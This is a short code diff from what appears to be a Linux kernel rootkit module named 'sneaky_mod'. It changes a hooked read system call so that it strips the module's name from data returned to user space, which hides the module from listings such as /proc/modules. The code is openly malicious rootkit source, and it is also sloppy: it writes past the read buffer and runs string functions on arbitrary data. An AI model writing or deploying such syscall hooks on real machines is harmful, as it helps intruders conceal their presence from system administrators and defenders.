@@ -87,8 +87,15 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,un
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
   int sz;
   sz = original_read(fd, buf, count);
-  buf[sz] = '\0';
-  printk(KERN_INFO "buf: %s.\n", buf);
+  char * temp = (char*)buf;
+  temp[sz] = '\0';
+  char * target = "sneaky_mod";
+  char * res = strstr(temp, target);
+  if(res){
+    printk(KERN_INFO "toremove mod:%s.\n", res);
+    memmove(res, res + strlen(target), strlen(res+strlen(target)));
+    return sz - strlen(target);
+  }
   return sz;
 }
 
